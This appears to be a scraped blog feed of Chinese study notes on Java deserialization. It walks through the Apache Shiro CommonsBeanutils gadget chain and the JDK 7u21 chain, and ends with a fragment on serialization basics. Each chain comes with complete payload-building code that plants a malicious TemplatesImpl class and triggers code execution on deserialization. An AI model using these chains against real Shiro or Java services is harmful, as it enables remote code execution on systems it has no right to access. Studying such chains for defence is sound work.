<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220320001010886.png" alt="image-20220320001010886"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220320001030875.png" alt="image-20220320001030875"></p>
<p>再调用cipherService接口的decrypt进行解密,解密后得到序列化字符串的bytes</p>
<p>然后对其调用<code>deserialize</code>进行反序列化</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220320001504110.png" alt="image-20220320001504004"></p>
<p>ois.readObject会调用<code>resolveClass</code>方法</p>
<p>这里需要注意的是Shiro并不是使用原生的反序列化，而是重写了ObjectInputStream,重写后的resolveClass方法最终调用的可以理解为findClass去加载类,而findClass是加载不了数组类的</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220320003813486.png" alt="image-20220320003813486"></p>
<h4 id="为什么findClass加载不了数组类"><a href="#为什么findClass加载不了数组类" class="headerlink" title="为什么findClass加载不了数组类?"></a>为什么findClass加载不了数组类?</h4><blockquote>
<p>看了讲解,由于java底层知识严重不足,只能勉强理解成如下</p>
</blockquote>
<p>findClass实质是将包名的路径更换成文件路径去调用defineClass去加载,而不会有class文件起数组的名字</p>
<p>如果是jdk自带的数组类,是可以加载的它调用的是Class.forName,</p>
<p>shiro中如果是网站下面的比如<code>WEBINF</code>下面的就会调用findClass去加载</p>
<h3 id="Shiro无依赖"><a href="#Shiro无依赖" class="headerlink" title="Shiro无依赖"></a>Shiro无依赖</h3><p>Shiro默认是没有CC依赖的,此时怎么通过反序列化开始代码执行呢?</p>
<p>Shiro默认有一个Commons-beanutils依赖,这个依赖中</p>
<p>Commons-beanutils依赖中有一个叫<code>PropertyUtils</code>的类,它有一个<code>getProperty</code>函数,能够通过传入的对象动态的调用其get方法</p>
<p><code>getProperty</code>最后会调用到``PropertyUtilsBean<code>的</code>getSimpleProperty`方法,</p>
<p>descriptor中包含属性值和其get set方法的名字,然后在invokeMethod中进行调用</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220321143032661.png" alt="image-20220321143032661"></p>
<p>恰好<code>TemplatesImpl</code>中有一个叫做<code>getOutputProperties()</code>的无参方法,它调用了cc3中需要调用的<code>newTransformer</code>方法</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220321143749765.png" alt="image-20220321143749765"></p>
<p>试一下能不能调用,要注意大小写,get方法采用的是驼峰命名方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line">        </span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<p>在<code>BeanComparator</code>中的<code>compare</code>方法中有调用getProperty</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220321144513243.png" alt="image-20220321144513243"></p>
<p>从这里开始就和CC2前半部分一样了,通过<code>PriorityQueue</code>类的<code>readObject</code>会调用到<code>compare</code>方法,</p>
<p>但是BeanComparator有个问题</p>
<blockquote>
<p>意外发现</p>
</blockquote>
<p>但是我在偶然的尝试中发现初始化的时候传入<code>Beancomparator</code>,只需要在反射之后再次设置<code>comparator</code>参数为<code>beanComparator</code>,还是能继续触发,但是这个时候队列add的时候需要第二个是templates,而不是第一个是templates,完事自己探究一下</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220321225636931.png" alt="image-20220321225636931"></p>
<p>因为Integer里面没有<code>getOutputProperties</code>方法,所以会报错,在初始化优先队列的时候传入一个之前CC2中用的<code>transformingComparator</code>,,等到add完成之后再通过反射修改<code>comparator</code>参数为<code>beanComparator</code></p>
<p>这里就有一个比较重要的思想,就是本地构造类的时候包和目标机器不一致是可以的,只要保证序列化进去的时候修改掉就行</p>
<p>payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        BeanComparator beanComparator = <span class="keyword">new</span> BeanComparator(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        Class&lt;? extends PriorityQueue&gt; priorityQueueClass = priorityQueue.getClass();</span><br><span class="line">        Field declaredField = priorityQueueClass.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        declaredField.set(priorityQueue,beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br></pre></td></tr></table></figure>

<p>加密编码后尝试,发现服务端报了这样一个错误,为什么Commons-utils会去加载CC里面的类呢</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220321231216837.png" alt="image-20220321231216837"></p>
<p>原因是BeanComparator方法的初始化方法调用了<code>ComparableComparator.getInstance()</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220321231636548.png" alt="image-20220321231636548"></p>
<p>不过它还有另一个构造方法,可以自己传入一个满足要求的<code>Comparator</code>,这个Comparator需要满足两点:1.在shiro默认依赖中或者jdk中存在2.由于需要反序列化,所以需要继承<code>Serializeable</code>接口还有<code>Comparator</code>接口</p>
<p>做一个脚本,先通过idea找到继承了接口的类,然后复制黏贴到txt文件中(先把依赖整对,别把别的依赖里面的类搞进去了)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">with <span class="title">open</span> <span class="params">(r<span class="string">&quot;C:\Users\MSI\Desktop\test\Serializeable.txt&quot;</span>)</span> as f:</span></span><br><span class="line"><span class="function">    data</span>=f.readline()</span><br><span class="line">    sers=[]</span><br><span class="line">    <span class="keyword">while</span> data:</span><br><span class="line">        sers.append(data)</span><br><span class="line">        data=f.readline()</span><br><span class="line"><span class="function">with <span class="title">open</span> <span class="params">(r<span class="string">&quot;C:\Users\MSI\Desktop\test\Comparator.txt&quot;</span>)</span> as c:</span></span><br><span class="line"><span class="function">    data</span>=c.readline()</span><br><span class="line">    coms=[]</span><br><span class="line">    <span class="keyword">while</span> data:</span><br><span class="line">        coms.append(data)</span><br><span class="line">        data=c.readline()</span><br><span class="line"><span class="keyword">for</span> i in sers:</span><br><span class="line">    <span class="keyword">if</span>(i in coms):</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220321234935305.png" alt="image-20220321234935305"></p>
<p>找到了如上这些满足条件的类,第一个<code>AttrCompare</code>就很好用,它只有默认的无参构造方法</p>
<p>尝试后成功</p>
<h5 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\classTest\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        BeanComparator beanComparator = <span class="keyword">new</span> BeanComparator(<span class="string">&quot;outputProperties&quot;</span>,<span class="keyword">new</span> AttrCompare());</span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        Class&lt;? extends PriorityQueue&gt; priorityQueueClass = priorityQueue.getClass();</span><br><span class="line">        Field declaredField = priorityQueueClass.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        declaredField.set(priorityQueue,beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>java</tag>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>7u21</title>
    <url>/2022/03/24/7u21/</url>
    <content><![CDATA[<p>首先去下载个jdk7u21<span id="more"></span></p>
<p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html</a></p>
<p>然后去下载对应版本的openjdk</p>
<p>参照这篇文章进行操作<a href="https://www.cnblogs.com/haimishasha/p/9909055.html">https://www.cnblogs.com/haimishasha/p/9909055.html</a></p>
<p>注:以下所有提到<code>templates</code>对象的地方,<code>templates</code>都指的是实例化<code>TemplatesImpl</code>并构造好的恶意类</p>
<h4 id="类分析"><a href="#类分析" class="headerlink" title="类分析"></a>类分析</h4><p><code>AnnotationInvocationHandler</code>这个类中有一个<code>equalsImpl</code>方法</p>
<p>它可以调用通过反射调用所有通过<code>getMemberMethods</code>获取到的Method数组中的method</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220324112303655.png" alt="image-20220324112303655"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!type.isInstance(o))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (Method memberMethod : getMemberMethods()) &#123;</span><br><span class="line">            String member = memberMethod.getName();</span><br><span class="line">            Object ourValue = memberValues.get(member);</span><br><span class="line">            Object hisValue = <span class="keyword">null</span>;</span><br><span class="line">            AnnotationInvocationHandler hisHandler = asOneOfUs(o);</span><br><span class="line">            <span class="keyword">if</span> (hisHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">                hisValue = hisHandler.memberValues.get(member);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    hisValue = memberMethod.invoke(o);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!memberValueEquals(ourValue, hisValue))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>也就是说， <code>equalsImpl</code> 这个方法是将 <code>this.type</code> 类中的所有方法遍历并执行了。那么，假设<code>this.type</code>是<code>TemplatesImpl</code>类，则势必会调用到其中的 <code>newTransformer() </code>或<code>getOutputProperties()</code>方法，进而触发任意代码执行。</p>
<h4 id="如何调用equalsImpl"><a href="#如何调用equalsImpl" class="headerlink" title="如何调用equalsImpl"></a>如何调用equalsImpl</h4><p>接下来找调用了<code>equalsImpl</code>方法的地方,因为其是private,所以一般都在本类中调用</p>
<p>在本类中的invoke方法中找到了<code>equalsImpl</code>的调用</p>
<p>这里就又涉及到了动态代理的问题</p>
<p><code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>接口,所以它只需要代理对应的类,然后调用类中的任意方法都会执行invoke方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">        String member = method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">assert</span> paramTypes.length == <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;toString&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;hashCode&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;annotationType&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        Object result = memberValues.get(member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(type, member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">            <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">            result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当调用的方法名为<code>equals</code>的时候,会调用<code>equalsImpl</code>方法</p>
<p>找<code>equals</code>方法调用链</p>
<p>比较Java对象的时候,常用的两个方法</p>
<ul>
<li>equals</li>
<li>compareTo</li>
</ul>
<p>任意java兑现都有<code>equals</code>方法,它通常用于比较两个对象是否是同一个引用,<code>而compareTo</code>实际上是<code>java.lang.Compareable</code>接口的方法,<code>java.util.PriorityQueue</code>中也用到过,通常被实现用于比较两个对象的值是否相等.</p>
<p>一个常见的会调用equals的场景是集合Set,Set中存储的对象不允许重复,所以在添加对象的时候,势必会涉及到比较操作.</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220324175504230.png" alt="image-20220324175504230"></p>
<p>可以把i暂且看为hashCode的单射函数,i就是对象在hash表中应该跟在哪个位置后面,当两个对象跟在同一个后面的时候,就会调用equals再次进行比较,接下来就是要让proxy对象的”i”等于templates的”i”</p>
<p>跟着P牛的逻辑</p>
<p>计算“哈希”的主要是下面这两行代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> hash = hash(key);</span><br><span class="line"><span class="keyword">int</span> i = indexFor(hash, table.length);</span><br></pre></td></tr></table></figure>

<p>将其中的关键逻辑提权出来，可以得到下面这个函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">	h ^= key.hashCode();</span><br><span class="line">	h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">	h = h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">return</span> h &amp; <span class="number">15</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除了<code>key.hashCode</code>外没有其他变量,所以proxy对象与<code>TemplateImpl</code>对象的”i”是否相等,仅仅取决于这两个对象的<code>hashCode</code>是否相等,TemplateImpl的<code>hashCode</code>是一个Native方法,每次运行都会发生变化,理论上是无法预测的,所以想让proxy的<code>hashCode</code>与之相等,只能寄希望于<code>proxy.hashCode</code></p>
<p><code>proxy.hashCode()</code> 仍然会调用到<code> AnnotationInvocationHandler#invoke</code> ，进而调用到 <code>AnnotationInvocationHandler#hashCodeImpl</code> ，这个方法代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;</span><br><span class="line">            result += (<span class="number">127</span> * e.getKey().hashCode()) ^</span><br><span class="line">                memberValueHashCode(e.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这段代码在看过p牛的解析后恍然大悟,果然是基础不牢,地动山摇,</p>
<p>最核心的一点就是很基础的<code>0异或任何数都等于该数本身</code></p>
<p>所以这个地方只需要保证<code>e.getKey().hashCode()</code>为0,那么就可以控制result为<code>memberValueHashCode(e.getValue())</code></p>
<p><code>f5a5a608</code>字符串的HashCode为0,那么就可以作为map的key放进去,从而让<code>hashCodeImpl()</code>返回的值为<code>templates</code>的hashCode,这样在后面就会触发equals方法</p>
<p>找hashCode为0的字符串脚本</p>
<p>起初是用int写的,结果太小没跑出了,怪不得每次就算+1,p牛也还是用的Long写的….</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; <span class="number">9999999999L</span>; i++) &#123;</span><br><span class="line">            String s=Long.toHexString(i);</span><br><span class="line">            <span class="keyword">if</span> (s.hashCode() == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Long.toHexString(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        String zeroHashCodeStr = <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\unser\\7u21\\target\\test-classes\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Class&lt;Templates&gt; templatesClass1 = Templates.class;</span><br><span class="line">        <span class="comment">//为templates创建代理实例proxy,调用proxy的任意方法都会调用到AnnotationInvocationHandler里面的invoke方法</span></span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)declaredConstructor.newInstance(Templates.class, map);</span><br><span class="line">        Object proxy= Proxy.newProxyInstance(test.class.getClassLoader(), templatesClass.getInterfaces(), handler);</span><br><span class="line">        HashSet hashSet = <span class="keyword">new</span> HashSet();</span><br><span class="line">        hashSet.add(templates);</span><br><span class="line">        hashSet.add(proxy);</span><br><span class="line">        map.put(zeroHashCodeStr,templates);</span><br><span class="line"></span><br><span class="line">        serialize(hashSet);</span><br><span class="line">        unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span><span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String path)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(path));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h3><p>HashSet.readObject()—–&gt;新建一个hash链表,接着开始计算hash, proxy由于代理了<code>AnnotationInvocationHandler</code>所以调用<code>hashCode</code>会在<code>invoke</code>中走到<code>hashCodeImpl</code>方法然后这个地方的<code>memberValues</code>是之前的精心构造的map,它的key的hash结果是0,所以会返回<code>Templates</code>的hash结果,</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;</span><br><span class="line">            result += (<span class="number">127</span> * e.getKey().hashCode()) ^</span><br><span class="line">                memberValueHashCode(e.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>于是proxy返回的hashCode和<code>Templates</code>的结果一样了,由于HashSet的特性,会调用<code>equals</code>方法,而proxy中调用<code>equals</code>方法会传入参数为<code>templates</code>作为调用到<code>equalsImpl</code>方法时<code>o</code>的值</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220325131726788.png" alt="image-20220325131726788"></p>
<p>该方法遍历并执行type中的所有方法,而type是<code>TemplatesImpl</code>的接口,它其中只包括了危险的<code>newTransformer</code>和<code>getOutputProperties</code>,而此时<code>o</code>是实例化好的templates,触发恶意代码执行,这块是CC2的知识</p>
<p>P牛的文章讲的真不错,静下心来看完收获不小呢</p>
<h5 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h5><p>画一个思维导图再加深一下理解</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220325134238553.png" alt="image-20220325134238553"></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java反序列化学习</title>
    <url>/2022/03/06/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h3><h5 id="反序列化特征"><a href="#反序列化特征" class="headerlink" title="反序列化特征"></a>反序列化特征<span id="more"></span></h5><p>下方的特征可以作为序列化的标志参考:</p>
<ul>
<li>一段数据以<code>rO0AB</code>开头，你基本可以确定这串就是Java序列化base64加密的数据。</li>
<li>或者如果以<code>aced</code>开头，那么他就是这一段Java序列化的16进制。</li>
</ul>
<p>Java序列化是指把java对象转换为字节序列的过程,而java反序列化是指把字节序列恢复为java对象的过程</p>
<p>序列化分将数据分解成字节流,以便存储在文件中或在网络上传输,反序列化就是打开字节流并重构对象,对象序列化不仅要将基本数据类型转换成字节表示,有时还要恢复数据,恢复数据要求有恢复数据的对象实例</p>
<p>应用场景:</p>
<p>1.想把内存中的对象保存到一个文件中或者数据库中的时候</p>
<p>2.想用套接字在网络上传送对象的时候</p>
<p>3.想通过RMI传输对象的时候</p>
<p>java现在有很多种不同的序列化方式,先从原生的开始</p>
